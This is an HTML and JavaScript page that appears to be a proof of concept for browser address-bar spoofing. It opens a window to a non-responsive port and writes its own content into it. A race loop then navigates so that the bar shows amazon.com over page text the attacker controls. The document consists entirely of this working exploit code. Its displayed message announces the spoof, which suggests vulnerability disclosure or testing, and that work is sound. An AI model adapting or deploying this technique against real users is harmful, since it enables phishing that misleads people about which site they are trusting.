<head>
  <meta name="viewport" content="width=device-width, initial-scale=1">
</head>
<body>
    <a href="javascript:window.open('https://www.amazon.com:8080/','x');" onclick="startSpoof()">Spoof</a>
</body>
    
<script>

let windowSpoof;
let hasNavigated = false; // ✅ TAMBAHAN: Flag untuk prevent multiple navigation

function race() {
  try {
    windowSpoof.location.href !== 'about:blank';
  }
  catch (e) {
    // ✅ TAMBAHAN: Navigate ke amazon sekali saja
    if (!hasNavigated) {
      hasNavigated = true;
      windowSpoof.location.href = 'https://www.amazon.com:8080/';
      console.log('✅ Navigating to Amazon...');
    }
  }
}

function startSpoof() {
  windowSpoof = window.open("https://www.google.com:82","x");
  windowSpoof.document.write("<h2>Your address bar has been spoofed. This is not https://www.amazon.com/</h2>");
  
  // ✅ TAMBAHAN: Close document
  windowSpoof.document.close();
  
  setInterval('race()', 0);
}

</script>
